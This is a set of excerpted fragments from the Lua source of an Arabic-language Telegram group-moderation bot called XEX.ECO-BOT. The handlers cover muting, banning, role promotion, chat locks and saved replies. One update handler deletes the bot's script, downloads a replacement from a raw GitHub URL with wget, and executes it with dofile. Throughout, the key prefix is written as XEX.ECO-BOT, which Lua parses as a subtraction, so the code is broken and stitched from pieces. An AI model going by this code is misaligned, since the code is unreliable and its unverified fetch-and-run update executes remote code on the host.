DevALS:srem(XEX.ECO-BOT..'ALS:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'AAAVAA')..')\n☆︙تم الغاء كتمه')
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:BanAll:', dp.id_)
DevALS:srem(XEX.ECO-BOT..'ALS:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'AAAVAA')..')\n☆︙تم الغاء العام')
end,nil)
end
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Tkeed:'..data.chat_id_, dp.id_)
...
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'AAAVAA')..')\n☆︙تم الغاء تقيده')
end,nil)
end
--     Source XEX.ECO-BOT     --
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..ALS},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..ALS}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..ALS},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..ALS}},{{text = '⌁ XEX.ECO-BOT TeAM.',url="t.me/AAAVAA"}}}
elseif Manager(data) then
...
local Del = DevALS:get(XEX.ECO-BOT..'ALS:Del')
local Text = [[
...
DevALS:del(XEX.ECO-BOT..'ALS:ALSSudo:')
...
DevALS:del(XEX.ECO-BOT..'ALS:SecondSudo:')
...
DevALS:del(XEX.ECO-BOT..'ALS:SudoBot:')
...
DevALS:del(XEX.ECO-BOT..'ALS:Owner:'..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:Constructor:'..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:Managers:'..data.chat_id_)
Text = "*☆︙تم حذف المدراء*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:VipMem:'..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:Cleaner:'..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:Muted:'..data.chat_id_)
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
...
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..data.chat_id_, v)
end
...
DevALS:del(XEX.ECO-BOT..'ALS:Ban:'..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:BanAll:')
DevALS:del(XEX.ECO-BOT..'ALS:MuteAll:')
...
--     Source XEX.ECO-BOT     --
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not DevALS:get(XEX.ECO-BOT..'ALS:Lock:GpRd'..data.chat_id_) then
local ALS = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevALS:smembers(XEX.ECO-BOT..'ALS:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*☆︙لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
DevALS:del(XEX.ECO-BOT..'ALS:Gif:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Voice:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Audio:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Photo:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Stecker:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Video:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:File:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpRed'..v..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Manager:GpRed'..data.chat_id_)
end
...
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not DevALS:get(XEX.ECO-BOT..'ALS:Lock:GpRd'..data.chat_id_) then
local ALS = DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevALS:smembers(XEX.ECO-BOT.."ALS:Sudo:AllRed")
if #redod == 0 then
Text = "*☆︙لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Gif:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Voice:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Audio:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Photo:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Stecker:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Video:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:File:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Text:AllRed"..v)
DevALS:del(XEX.ECO-BOT.."ALS:Sudo:AllRed")
end
...
local List = DevALS:smembers(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
DevALS:del(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
DevALS:del(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_)
end
...
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"ا")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":م","رفع مميز")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"م")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":اد","رفع ادمن")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"اد")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":مد","رفع مدير")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"مد")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":من","رفع منشئ")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"من")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":اس","رفع منشئ اساسي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"اس")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطور")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"مط")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع مطور ثانوي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"ثانوي")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":تك","تنزيل الكل")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"تك")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"تعط")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"تفع")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":ر","الرابط")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"ر")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":رر","ردود المدير")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"رر")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"،،")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":رد","اضف رد")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"رد")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":غ","غنيلي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"غ")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..data.chat_id_..":#","مسح قائمه العام")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..data.chat_id_,"#")
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_, admins[i].user_id_)
...
DevALS:sadd(XEX.ECO-BOT.."ALS:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevALS:sadd(XEX.ECO-BOT.."ALS:ALSConstructor:"..data.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(XEX.ECO-BOT.."ALS:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevALS:srem(XEX.ECO-BOT.."ALS:ALSConstructor:"..data.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevALS:sismember(XEX.ECO-BOT..'ALS:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, '☆︙المجموعه بالتاكيد مفعله')
else
Text = "☆︙تم تفعيل المجموعه "..dp.title_
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..data.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..data.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..data.sender_user_id_}},{{text="‹ TeAm XEX.ECO-BOT ›",url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevALS:sadd(XEX.ECO-BOT.."ALS:Groups",data.chat_id_)
if not DevALS:get(XEX.ECO-BOT..'ALS:SudosGp'..data.sender_user_id_..data.chat_id_) and not SecondSudo(data) then 
DevALS:incrby(XEX.ECO-BOT..'ALS:Sudos'..data.sender_user_id_,1)
DevALS:set(XEX.ECO-BOT..'ALS:SudosGp'..data.sender_user_id_..data.chat_id_,"ALS")
end
...
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Links"..data.chat_id_,LinkGroup) 
...
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,dp) 
if not DevALS:sismember(XEX.ECO-BOT..'ALS:Groups',data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙المجموعه بالتاكيد معطله") 
else
Text = "☆︙تم تعطيل المجموعه "..dp.title_
keyboard = {}
keyboard.inline_keyboard = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..data.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..data.sender_user_id_}},{{text="‹ TeAm XEX.ECO-BOT ›",url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevALS:srem(XEX.ECO-BOT.."ALS:Groups",data.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
Text = "☆︙تم ترتيب الاوامر بالشكل التالي ~\n☆︙ ايدي - ا .\n☆︙ رفع مميز - م .\n☆︙رفع ادمن - اد .\n☆︙ رفع مدير - مد . \n☆︙ رفع منشى - من . \n☆︙ رفع منشئ الاساسي - اس  .\n☆︙ رفع مطور - مط .\n☆︙رفع مطور ثانوي - ثانوي .\n☆︙ تنزيل الكل - تك .\n☆︙ تعطيل الايدي بالصوره - تعط .\n☆︙ تفعيل الايدي بالصوره - تفع .\n☆︙ الرابط - ر .\n☆︙ ردود المدير - رر .\n☆︙ مسح المكتومين - ،، .\n☆︙ اضف رد - رد .\n☆︙ مسح سحكاتي - سح .\n☆︙ مسح رسائلي - رس .\n☆︙ غنيلي - غ .\n☆︙مسح قائمه العام"
keyboard = {} 
keyboard.inline_keyboard = {{{text="‹ رجوع ›",callback_data="/Reload:"..data.sender_user_id_}},{{text='‹ TeAm XEX.ECO-BOT ›',url="t.me/AAAVAA"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source David     --
...
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..data.chat_id_,Manager_id)  
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSConstructor:'..data.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
local DelSudoRep = DevALS:get(XEX.ECO-BOT..'DelSudoRep')
DevALS:del(XEX.ECO-BOT.."ALS:Sudo:AllRed",DelSudoRep)
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllText"..data.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllRed"..data.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."DelSudoRep")
Text = "☆︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ TeAm XEX.ECO-BOT .',url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
local DelManagerRep = DevALS:get(XEX.ECO-BOT..'DelManagerRep'..data.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRed'..data.chat_id_,DelManagerRep)
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpText'..data.sender_user_id_..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRed'..data.sender_user_id_..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'DelManagerRep'..data.chat_id_)
Text = "☆︙تم الغاء حفظ الرد"
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ TeAm XEX.ECO-BOT .',url="t.me/AAAVAA"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Cmd = DevALS:get(XEX.ECO-BOT..'ALS:Cmd')
local Text = [[
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Msg = DevALS:get(XEX.ECO-BOT..'ALS:Msg')
local Text = [[
...
DevALS:del(XEX.ECO-BOT..'ALS:EditMsg'..data.chat_id_..data.sender_user_id_)
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Filter = DevALS:get(XEX.ECO-BOT..'ALS:Filter')
local Text = [[
...
DevALS:del(XEX.ECO-BOT.."ALS:FilterAnimation"..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT.."ALS:FilterSteckr"..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT.."ALS:FilterPhoto"..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT..'ALS:Filters:'..data.chat_id_)
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local locklist = DevALS:get(XEX.ECO-BOT..'ALS:locklist')
local Text = [[
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local LockBotList = DevALS:get(XEX.ECO-BOT..'ALS:LockBotList')
local Text = [[
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local LockSpamList = DevALS:get(XEX.ECO-BOT..'ALS:LockSpamList')
local Text = [[
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Join'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Join'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Join'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Join'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Text'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Text'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Text'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Text'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:TagServr'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:TagServr'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:TagServr'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:TagServr'..data.chat_id_) 
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stickers'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Stickers'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stickers'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Stickers'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Gifs'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Gifs'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Gifs'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Gifs'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Photo'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Photo'..data.chat_id_,true) 
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Photo'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Photo'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Videos'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Videos'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Videos'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Videos'..data.chat_id_)
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Forwards'..data.chat_id_) then
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Forwards'..data.chat_id_,true)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Forwards'..data.chat_id_) then
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Forwards'..data.chat_id_) 
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..data.chat_id_,"kick")  
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..data.chat_id_,"ked")   
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..data.chat_id_,"del")  
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:Bots"..data.chat_id_) 
...
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
...
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
...
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
...
DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
...
DevALS:hdel(XEX.ECO-BOT.."ALS:Spam:Group:User"..data.chat_id_ ,"Spam:User")  
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Source = DevALS:get(XEX.ECO-BOT..'ALS:Source')
local Text = [[
...
os.execute('rm -rf XEX.ECO-BOT.lua') 
os.execute('wget https://raw.githubusercontent.com/XEX-Murtaza/XEX.ECO-BOT/main/XEX.ECO-BOT.lua') 
dofile('XEX.ECO-BOT.lua') 
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Media = DevALS:get(XEX.ECO-BOT..'ALS:Media')
local Text = [[
...
local List = DevALS:smembers(XEX.ECO-BOT.."ALS:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
local List = DevALS:smembers(XEX.ECO-BOT.."ALS:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevALS:del(XEX.ECO-BOT.."ALS:cleanermusic"..data.chat_id_)
else
...
if DevALS:get(XEX.ECO-BOT.."ALS:Left:Bot"..XEX.ECO-BOT) then
...
ChatLeave(data.chat_id_, XEX.ECO-BOT) 
DevALS:srem(XEX.ECO-BOT.."ALS:Groups",data.chat_id_)
end           
...
if not DevALS:get(XEX.ECO-BOT.."ALS:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or DevALS:get(XEX.ECO-BOT.."Private:Group:Link"..data.chat_id_) 
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:GpLinks'..data.chat_id_) then 
if DevALS:get(XEX.ECO-BOT.."ALS:Groups:Links"..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙Group Link ↬ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"..DevALS:get(XEX.ECO-BOT.."ALS:Groups:Links"..data.chat_id_), 1, "html")
else 
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local order = DevALS:get(XEX.ECO-BOT..'ALS:order')
local Text = [[
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Id:Photo'..data.chat_id_,true)
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Id:Photo'..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Id'..data.chat_id_,true)
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Id'..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:GpLinks"..data.chat_id_,"ok")
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:GpLinks"..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:GpLinksinline"..data.chat_id_,"ok")
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:GpLinksinline"..data.chat_id_)
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:Welcome"..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Welcome"..data.chat_id_,true)
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:AllRed'..data.chat_id_,true)
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:AllRed'..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:GpRed'..data.chat_id_,true)
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:GpRed'..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."ALS:Del:Me"..data.chat_id_, true)
Text = "*☆︙تم تعطيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(XEX.ECO-BOT.."ALS:Del:Me"..data.chat_id_)
Text = "*☆︙تم تفعيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:set(XEX.ECO-BOT.."ALS:Kick:Me"..data.chat_id_, true)
...
DevALS:del(XEX.ECO-BOT.."ALS:Kick:Me"..data.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:KickBan"..data.chat_id_,"true")
Text = "*☆︙تم تعطيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:KickBan"..data.chat_id_)
Text = "*☆︙تم تفعيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:ProSet"..data.chat_id_,"true")
Text = "*☆︙تم تعطيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:ProSet"..data.chat_id_)
Text = "*☆︙تم تفعيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Games'..data.chat_id_,true)  
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Games'..data.chat_id_) 
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help')
local Text = [[
...
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help1')
local Text = [[
...
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help2')
local Text = [[
☆︙اوامر الادمنيه ↫ ⤈
